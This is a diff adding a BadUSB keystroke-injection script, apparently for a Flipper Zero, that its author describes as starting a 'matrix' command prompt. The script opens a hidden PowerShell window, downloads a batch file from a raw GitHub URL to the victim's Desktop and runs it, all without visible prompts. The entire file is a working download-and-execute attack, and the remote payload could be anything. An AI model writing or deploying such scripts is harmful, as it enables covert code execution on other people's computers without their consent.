@@ -1,0 +1,12 @@
+REM Author: SeenKid (seenkid#1337 on Discord)
+REM Description: Starts a matrix command prompt
+REM Version: 1.0
+DELAY 500
+GUI r
+DELAY 900
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 900
+STRING $DesktopPath = [Environment]::GetFolderPath("Desktop"); Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/matrix.bat -OutFile "$DesktopPath/matrix.bat"; Start-Process "cmd.exe"  "/c $DesktopPath/matrix.bat;"
+DELAY 200
+ENTER
